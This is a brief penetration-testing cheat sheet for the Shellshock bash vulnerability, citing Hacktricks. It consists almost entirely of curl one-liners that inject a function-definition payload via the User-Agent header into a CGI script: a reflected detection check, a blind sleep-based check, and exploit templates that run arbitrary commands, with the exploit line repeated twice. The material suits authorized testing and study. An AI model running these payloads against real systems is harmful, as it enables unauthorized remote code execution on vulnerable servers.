# Shellshock

## Detection

### Reflected

```
$ curl -fs -H "user-agent: () { :; }; echo; echo 'VULNERABLE'" http[s]://<IP>/cgi-bin/vulnerable | grep VULNERABLE
```

### Blind

```
$ curl -fs -H "user-agent: () { :; }; /bin/bash -c 'sleep 5'" http[s]://<IP>/cgi-bin/vulnerable
```

## Exploit

```
$ curl -fs -H "user-agent: () { :; }; <commands>" http[s]://<IP>/cgi-bin/vulnerable

$ curl -fs -H "user-agent: () { :; }; <commands>" http[s]://<IP>/cgi-bin/vulnerable
```

---
## References

### Hacktricks

- [Hacktricks: CGI](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/cgi.html)